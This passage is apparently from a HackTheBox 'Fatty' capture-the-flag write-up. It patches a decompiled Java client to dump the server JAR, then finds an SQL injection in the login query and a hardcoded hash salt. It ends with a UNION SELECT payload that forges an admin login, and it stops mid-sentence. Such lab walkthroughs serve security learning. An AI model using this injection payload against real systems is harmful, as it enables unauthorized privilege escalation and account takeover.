class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>What we could access is <code>/opt/fatty/fatty-server.jar</code> but we can only read text
files, not binaries:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">grep -rn binar htb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">htb/fatty/client/methods/Invoker.java:140:       response = &quot;Unable to convert byte[] to String. Did you read in a binary file?&quot;;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So we will have to modify the function to save the file locally on our
filesystem.</p><p>We&#x27;ll hack into <code>htb/fatty/client/methods/Invoker.java</code>, the <code>public String open</code>
method.
We&#x27;ll modify that part, from</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/* 138 */       response = this.response.getContentAsString();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/* 139 */     } catch (Exception e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/* 140 */       response = &quot;Unable to convert byte[] to String. Did you read in a binary file?&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>to</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.io.File;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.io.FileOutputStream;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response = &quot;Write to local FS...&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  File file = new File(filename);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  FileOutputStream outputStream = new FileOutputStream(file);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  outputStream.write(this.response.getContent());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  outputStream.close();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">} catch (Exception e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response - &quot;Error&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>or</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.nio.file.Files;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.nio.file.Path;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.nio.file.Paths;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response = &quot;Write to local FS...&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Path path = Paths.get(filename);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Files.write(path, this.response.getContent());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">} catch (Exception e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response - &quot;Error&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>or even:</p><p>Let&#x27;s try to add a method in <code>/htb/fatty/shared/message/ResponseMessage.java</code></p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">import java.io.FileOutputStream;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    public void saveContentToFile(String filename) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        try(FileOutputStream stream = new FileOutputStream(filename)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            stream.write(this.content);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        } catch (IOException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>and then in <code>htb/fatty/client/methods/Invoker.java</code>:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response = &quot;Write to local FS...&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.response.saveContentToFile(filename);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">} catch (Exception e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  response = &quot;Error&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>With one of those 3 ways we are able to dump binary files.
Let&#x27;s dump <code>fatty-server.jar</code>:</p><p><img loading="lazy" src="https://i.imgur.com/lSf53kW.png" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="code-analysis-fatty-server">Code analysis: fatty server<a href="#code-analysis-fatty-server" class="hash-link" aria-label="Direct link to Code analysis: fatty server" title="Direct link to Code analysis: fatty server">​</a></h2><p>Now let&#x27;s decompiler the server JAr with <a href="https://java-decompiler.github.io/" target="_blank" rel="noopener noreferrer">JD-GUI</a> again and export
the code to read it with VSCode.</p><p>It&#x27;s maybe time to looks for the the SQLi, we already know it&#x27;s in the
connection code.</p><p>The SQL queries seem to be handle in <code>htb/fatty/server/database/FattyDbSession.java</code>.</p><p>The authentication function looks like that:</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public User checkLogin(User user) throws LoginException {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  Statement stmt = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ResultSet rs = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  User newUser = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    stmt = this.conn.createStatement();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    rs = stmt.executeQuery(&quot;SELECT id,username,email,password,role FROM users WHERE username=&#x27;&quot; + user.getUsername() + &quot;&#x27;&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      Thread.sleep(3000L);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    } catch (InterruptedException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      return null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    if (rs.next()) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      int id = rs.getInt(&quot;id&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      String username = rs.getString(&quot;username&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      String email = rs.getString(&quot;email&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      String password = rs.getString(&quot;password&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      String role = rs.getString(&quot;role&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      newUser = new User(id, username, password, email, Role.getRoleByName(role), false);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      if (newUser.getPassword().equalsIgnoreCase(user.getPassword())) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        return newUser;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      throw new LoginException(&quot;Wrong Password!&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    throw new LoginException(&quot;Wrong Username!&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  catch (SQLException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    this.logger.logError(&quot;[-] Failure with SQL query: ==&gt; SELECT id,username,email,password,role FROM users WHERE username=&#x27;&quot; + user.getUsername() + &quot;&#x27; &lt;==&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    this.logger.logError(&quot;[-] Exception was: &#x27;&quot; + e.getMessage() + &quot;&#x27;&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    return null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see the <code>Thread.sleep(3000L);</code> that make time-based attacks difficult
but that doesn&#x27;t mean we can&#x27;t make a one-shot SQLi as we still control the
username injected in the query.</p><p>Before we forge a payload, let&#x27;s take a look at the password format saved in DB.
We can see in <code>htb/fatty/shared/resources/User.java</code> is salted and hashed.</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">public void setPassword(String password) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  String hashString = this.username + password + &quot;clarabibimakeseverythingsecure&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  MessageDigest digest = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    digest = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  } catch (NoSuchAlgorithmException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  this.password = DatatypeConverter.printHexBinary(hash);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s compute the hash:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ printf %s &#x27;qtcclarabibiclarabibimakeseverythingsecure&#x27; | sha256sum</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046  -</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can also note that only password is checked and only username is used for
user retrieval, that means we can inject whatever we want in the ID field or
email address.
But what matters to us is to change our role from <code>user</code> to <code>admin</code>.</p><p>So we end with the following payload</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cyfun&#x27; union select 1337,&#x27;qtc&#x27;,&#x27;qtc@fatty.htb&#x27;,&#x27;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#x27;,&#x27;admin</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Once the payload is injected in the query this will give:</p><div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">SELECT</span><span class="token plain"> id</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">username</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">password</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain">role </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">FROM</span><span class="token plain"> users </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">WHERE</span><span class="token plain"> username</span><span class="token operator">=</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;cyfun&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">union</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">select</span><span class="token plain"> </span><span class="token number">1337</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;qtc&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;qtc@fatty.htb&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;admin&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In <code>htb/fatty/client/gui/ClientGuiTest.java</code> we can see the password is set by
the <code>setPassword</code> function we saw earlier.</p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">JButton btnNewButton = new JButton(&quot;Login &quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">btnNewButton.addActionListener(new ActionListener() {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">      public void actionPerformed(ActionEvent e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        String username = ClientGuiTest.this.tfUsername.getText().trim();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        String password = new String(ClientGuiTest.this.tfPassword.getPassword());</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ClientGuiTest.this.user = new User();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ClientGuiTest.this.user.setUsername(username);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ClientGuiTest.this.user.setPassword(password);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          ClientGuiTest.this.conn = Connection.getConnection();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        } catch (htb.fatty.client.connection.Connection.ConnectionException e1) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(LoginPanel, &quot;Connection Error!&quot;, &quot;Error&quot;, 0);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          return;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        if (ClientGuiTest.this.conn.login(ClientGuiTest.this.user)) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          JOptionPane.showMessageDialog(LoginPanel, &quot;Login Successful!&quot;, &quot;Login&quot;, 1);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can also it in <code>htb/fatty/shared/resources/User.java</code></p><div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */   public User(int uid, String username, String password, String email, Role role) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  20 */     this.uid = uid;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  21 */     this.username = username;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  23 */     String hashString = this.username + password + &quot;clarabibimakeseverythingsecure&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  24 */     MessageDigest digest = null;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     try {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  26 */       digest = MessageDigest.getInstance(&quot;SHA-256&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  27 */     } catch (NoSuchAlgorithmException e) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  28 */       e.printStackTrace();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */     }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  30 */     byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  32 */     this.password = DatatypeConverter.printHexBinary(hash);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  33 */     this.email = email;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*  34 */     this.role = role;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">/*     */   }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Putting our payload as username and 